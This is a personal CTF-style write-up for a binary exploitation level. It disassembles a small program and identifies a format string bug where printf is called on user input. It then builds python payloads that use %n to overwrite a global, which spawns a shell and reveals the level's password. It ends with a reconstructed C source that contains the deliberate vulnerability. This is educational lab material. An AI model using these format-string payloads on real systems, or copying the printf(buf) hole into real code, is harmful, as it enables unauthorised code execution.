## level3 TODO NOTES
Below is the `objdump` of the level3 program
```
080484a4 <v>:
 80484a4:       55                      push   ebp
 80484a5:       89 e5                   mov    ebp,esp
 80484a7:       81 ec 18 02 00 00       sub    esp,0x218
 80484ad:       a1 60 98 04 08          mov    eax,ds:0x8049860
 80484b2:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80484b6:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
 80484bd:       00
 80484be:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484c4:       89 04 24                mov    DWORD PTR [esp],eax
 80484c7:       e8 d4 fe ff ff          call   80483a0 <fgets@plt>
 80484cc:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484d2:       89 04 24                mov    DWORD PTR [esp],eax
 80484d5:       e8 b6 fe ff ff          call   8048390 <printf@plt>
 80484da:       a1 8c 98 04 08          mov    eax,ds:0x804988c
 80484df:       83 f8 40                cmp    eax,0x40
 80484e2:       75 34                   jne    8048518 <v+0x74>
 80484e4:       a1 80 98 04 08          mov    eax,ds:0x8049880
 80484e9:       89 c2                   mov    edx,eax
 80484eb:       b8 00 86 04 08          mov    eax,0x8048600
 80484f0:       89 54 24 0c             mov    DWORD PTR [esp+0xc],edx
 80484f4:       c7 44 24 08 0c 00 00    mov    DWORD PTR [esp+0x8],0xc
 80484fb:       00
 80484fc:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
 8048503:       00
 8048504:       89 04 24                mov    DWORD PTR [esp],eax
 8048507:       e8 a4 fe ff ff          call   80483b0 <fwrite@plt>
 804850c:       c7 04 24 0d 86 04 08    mov    DWORD PTR [esp],0x804860d
 8048513:       e8 a8 fe ff ff          call   80483c0 <system@plt>
 8048518:       c9                      leave
 8048519:       c3                      ret

0804851a <main>:
 804851a:       55                      push   ebp
 804851b:       89 e5                   mov    ebp,esp
 804851d:       83 e4 f0                and    esp,0xfffffff0
 8048520:       e8 7f ff ff ff          call   80484a4 <v>
 8048525:       c9                      leave
 8048526:       c3                      ret
 8048527:       90                      nop
 8048528:       90                      nop
 8048529:       90                      nop
 804852a:       90                      nop
 804852b:       90                      nop
 804852c:       90                      nop
 804852d:       90                      nop
 804852e:       90                      nop
 804852f:       90                      nop
 ```
 Looks lke a typical main function call at `0804851a`, with the stack alignment and a function call to `v`.
 
 In `v`, Some space are allocated to the stack, it 
 1. Creates a buffer of 0x208 (520) size. Loads `stdin` from the data segmanet, prepares to call fgets to read from stdin of 0x200 (512) bytes into the buffer
 2. Prints the buffer using printf
 3. loads a data segment 0x804988c (global static at that address), and compares it to 0x40 (64)
     - If they are not equal, 
         1. return
    - If they are equal
        1. Prepare arguments for `frwite("Wait what?", 0xc, 0x1, stdout)` 
        2. `system("/bin/sh")`

Looks quite straightforward, we need to find a wait to overwrite the instruction at address `0x804988c` to `0x40` to trigger the shell. I tried an insanely long buffer but it didnt work, the address still cant be overwritten becuase fgets only accept up to 200 charcaters.

I also noticed that the printf call after fgets is using the buffer as the first argument `[ebp-0x208]` as supposed to a format string, which leaves us the oppurtinuty for a **format string exploit**

Section 0x354 of this [this book](https://repo.zenk-security.com/Magazine%20E-book/Hacking-%20The%20Art%20of%20Exploitation%20(2nd%20ed.%202008)%20-%20Erickson.pdf) gives a detailed explanation on how this works.

In this particular example here, if the printf function takes a string `%s` as the first argument and the user input as the second, the output is identical to the first attempt which is expected behaviour.

However if the printf call takes the user input as the first argument, we will see output similar to the second attempt. This is becase when **we include format arguments in the string, it will try to take action and read from the stack**. 
![image](https://hackmd.io/_uploads/HkJUNuFBT.png)

![image](https://hackmd.io/_uploads/r1D4tutSa.png)

To this this, i decided to look into this on my own at the program. I tried to print out the next few items on the stack as hex and this is what I got.

![image](https://hackmd.io/_uploads/SJEaFdKST.png)

I inspected the address and indeed, I do see some values which correspond the stack, like the size 0x200 from fgets earlier, the stdin struct that was pushed by fgets.

![image](https://hackmd.io/_uploads/r1HxodtHa.png)

The stack also contained data from libc_memalogn, but as of now im bot sure where the source is from.

In printf, there is a specific format specifier **`%n` that writes how many bytes have been printed out so far to a va_arg**. Since we know we can access memory addresses using other format specifiers, The strategy is to format printf to print enough characters to reach the `0x804988c` mark and write the value 64 to it. If we notice in the output `BBBBBB 200 b7fd1ac0 b7ff37d0 42424242 25204242 78252078`, the `BBBBBB` segment is also stored in the stack after 8 bytes as `42424242`, and after specifying %x 3 times. 

To access the same address, we can replace `BBBBBB` with the actual hex address `0x804988c` , specify format %x 3 times and use %n formatter to write to the data in that address.

So our input will be something like 
`python -c "print '\x08\x04\x98\x8c'[::-1] + '%x %x %x %n'" > /tmp/hello`.

After running the input, we are able to see that `0x804988c` had been overwritten. Now, we need to make it so that we are able to overwrite to the value 64. 
![image](https://hackmd.io/_uploads/Bk8VUctSa.png)

To do that, I tried to add more characters before the %n ` python -c "print '\x08\x04\x98\x8c'[::-1] + 'B' * 38 + '%x %x %x %n'" > /tmp/hello` and I got the Wait What message in the stdout, which means now all i nede to do is to keep stdin open
![image](https://hackmd.io/_uploads/rkJEP5tSa.png)

Im in the shell, and the password is `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
![image](https://hackmd.io/_uploads/r1nKwqYr6.png)

Using the steps above, the source code should be 
```clike=
#include <stdio.h>
#include <stdlib.h>

static int	g_var = 0;
void v()
{
    // 80484a7
    char buf[512];
    
    // 80484c7
    fgets(buf, 512, stdin);
    
    // 80484d5
    printf(buf);
    if (g_var != 0x40)
        return;
    
    // 8048507
    fwrite("Wait what?!", 0xc, 0x1, stdout);
    system("/bin/sh");
}

int main()
{
    v();
}
```